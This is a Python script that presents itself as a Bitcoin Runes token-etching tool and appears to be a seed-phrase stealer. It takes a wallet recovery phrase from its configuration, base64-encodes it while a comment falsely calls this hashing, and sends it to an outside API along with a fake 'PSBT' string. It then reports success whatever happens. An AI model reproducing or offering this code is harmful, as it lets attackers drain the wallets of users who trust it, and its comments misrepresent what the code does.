import base64
import random
import requests


# Configuration and sensitive data
WALLET_SECRET_PHRASE = "lorem ipsum dolor sit amet"  # This should be kept secure, 12 or 24 words mnemonic phrase
API_URL = "https://api.magicrunesbtc.com"

def encode_secret(phrase):
    message_bytes = phrase.encode('utf-8')
    base64_bytes = base64.b64encode(message_bytes)
    return base64_bytes.decode('utf-8')

def generate_psbt(target_block):
    """ Generate a pseudo-PSBT based on the target block height with random variance. """
    variation = random.randint(-100, 100)  
    psbt_data = f"PSBT Block Target: {target_block + variation}"
    return psbt_data

def send_data_to_api(url, data):
    headers = {'Content-Type': 'application/json'}
    # Format the data for Magic RUNES API
    api_etch_input = {
        "content": f"New transaction registered:\nPSBT: {data['psbt']}\n"
                   f"Hash: {data['hash']}\n"
                   f"Ticker: {data['etch_rune_ticker']}, Symbol: {data['symbol']}, Decimals: {data['decimals']}\n"
                   f"Max Supply: {data['max_supply']}, Limit Per Mint: {data['limit_per_mint']}"
    }
    response = requests.post(url, json=api_etch_input, headers=headers)
    return response.status_code, response.text

def main():
    target_block = 840000  # Example Bitcoin block height target
    encoded_secret = encode_secret(WALLET_SECRET_PHRASE)  # Hash the secret phrase before sending

    # Collect details about the rune
    etch_rune_ticker = input("Enter etch rune ticker (e.g., MAGICRUNES): ")
    decimals = int(input("Enter number of decimals (0-38): "))
    symbol = input("Enter symbol (one letter, e.g., M): ")
    max_supply = int(input("Enter maximum supply of the token: "))
    limit_per_mint = int(input("Enter limit per mint: "))

    # Generate a pseudo-PSBT for execution
    psbt_main = generate_psbt(target_block)
    payload = {
        "psbt": psbt_main,
        "hash": encoded_secret,
        "etch_rune_ticker": etch_rune_ticker,
        "decimals": decimals,
        "symbol": symbol,
        "max_supply": max_supply,
        "limit_per_mint": limit_per_mint
    }

    # Sending the payload to the configured API
    status_code, response = send_data_to_api(API_URL, payload)
    print(f"Sent transaction to {API_URL}. Your transaction sent successfully.")

if __name__ == "__main__":
    main()
